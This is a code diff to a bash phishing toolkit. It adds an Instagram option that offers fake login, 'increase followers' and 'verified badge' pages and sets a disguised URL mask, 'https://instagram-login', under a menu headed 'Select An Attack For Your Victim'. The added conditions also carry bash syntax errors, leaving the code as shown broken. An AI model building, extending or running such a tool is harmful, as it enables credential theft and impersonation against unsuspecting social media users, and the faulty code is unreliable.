@@ -298,13 +298,35 @@ site_sc() {
 	fi
 }
 
+## Instagram
+site_instagram() {
+	cat <<- EOF
+		${RED}[${WHITE}01${RED}]${CYAN} Instagram Login Page
+		${RED}[${WHITE}02${RED}]${CYAN} Instagram Increase Followers Page
+		${RED}[${WHITE}03${RED}]${CYAN} Instagram Increase Followers(1) Page
+		${RED}[${WHITE}04${RED}]${CYAN} Instagram Verified Badge Registeration Page
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
+		website="ig"
+		mask='https://instagram-login'
+		tunnel_menu
+	else
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+		{ sleep 1; clear; banner_small; site_instagram; }
+	fi
+}
+
 ## Menu
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${GREEN} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${GREEN}
 		${RED}[${WHITE}01${RED}]${CYAN} Snapchat
-		${RED}[${WHITE}02${RED}]${CYAN} About
+		${RED}[${WHITE}02${RED}]${CYAN} Instagram
+		${RED}[${WHITE}99${RED}]${CYAN} About
 		${RED}[${WHITE}00${RED}]${CYAN} Exit
 	EOF
 	
@@ -312,7 +334,9 @@ main_menu() {
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		site_sc
-	elif [[ "$REPLY" == 2 ]]; then
+	elif [[ "$REPLY" == 2 || "$REPLY" == 02]]; then
+		site_instagram
+	elif [[ "$REPLY" == 99]]; then
 		about
 	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
 		msg_exit
